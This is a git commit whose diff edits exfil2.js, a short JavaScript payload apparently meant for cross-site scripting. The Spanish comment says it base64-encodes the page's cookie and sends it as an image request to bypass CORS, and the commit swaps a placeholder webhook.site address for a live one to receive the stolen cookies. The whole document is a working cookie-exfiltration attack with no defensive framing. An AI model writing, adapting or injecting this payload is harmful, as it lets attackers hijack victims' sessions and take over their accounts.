c7485f18bfc99991066be4ce7bcfdb9f63bc2a60
Luizxz <118949863+Liuz94@users.noreply.github.com>
2026-07-26 21:59:02 -0500

    Update webhook URL for cookie exfiltration

--- exfil2.js
+++ exfil2.js
@@ -1,3 +1,3 @@
 // Codifica la cookie en base64 y la envía como imagen (bypass CORS)
 var x = new Image();
-x.src = "https://webhook.site/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX?data=" + btoa(document.cookie);
+x.src = "https://webhook.site/bece384c-6c1c-4e4f-88c3-b2904037892e?data=" + btoa(document.cookie);
